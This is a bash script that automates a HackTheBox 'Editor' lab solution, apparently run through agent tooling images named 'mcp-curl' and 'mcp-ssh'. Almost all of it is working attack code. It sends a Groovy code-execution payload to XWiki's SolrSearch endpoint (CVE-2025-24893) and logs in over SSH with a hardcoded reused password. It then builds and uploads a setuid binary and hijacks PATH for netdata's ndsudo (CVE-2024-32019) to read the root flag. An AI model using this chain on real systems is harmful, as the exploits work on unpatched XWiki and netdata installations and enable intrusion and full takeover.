#!/bin/bash
# HTB Editor - Speedrun Script
# Requires: mcp-curl, mcp-ssh Docker images
# Target: 10.129.231.23

TARGET="10.129.231.23"
USER_PASS="theEd1t0rTeam99"

echo "[*] Step 1: Exploit XWiki RCE (CVE-2025-24893) to confirm access"
PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('}}}{{async async=false}}{{groovy}}println(\"id\".execute().text){{/groovy}}{{/async}}', safe=''))")
docker run --rm --network host mcp-curl:latest curl -s "http://${TARGET}:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=${PAYLOAD}" | grep -oP '\[}}}\K[^\]]+'

echo "[*] Step 2: SSH as oliver with password reuse"
docker run --rm --network host mcp-ssh:latest sshpass -p "${USER_PASS}" ssh -o StrictHostKeyChecking=no oliver@${TARGET} 'cat /home/oliver/user.txt'

echo "[*] Step 3: Compile privesc payload"
cat > /tmp/nvme.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
int main() { setuid(0); setgid(0); system("/bin/cat /root/root.txt"); return 0; }
EOF
gcc -static -o /tmp/nvme /tmp/nvme.c

echo "[*] Step 4: Upload payload"
split -b 50000 /tmp/nvme /tmp/nvme_chunk_
docker run --rm --network host mcp-ssh:latest sshpass -p "${USER_PASS}" ssh -o StrictHostKeyChecking=no oliver@${TARGET} 'rm -f /tmp/nvme'
for chunk in /tmp/nvme_chunk_*; do
    b64=$(base64 -w0 "$chunk")
    docker run --rm --network host mcp-ssh:latest sshpass -p "${USER_PASS}" ssh -o StrictHostKeyChecking=no oliver@${TARGET} "echo '$b64' | base64 -d >> /tmp/nvme"
done

echo "[*] Step 5: Execute CVE-2024-32019 (netdata ndsudo)"
docker run --rm --network host mcp-ssh:latest sshpass -p "${USER_PASS}" ssh -o StrictHostKeyChecking=no oliver@${TARGET} 'chmod +x /tmp/nvme && PATH=/tmp:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list'

echo "[*] Done!"
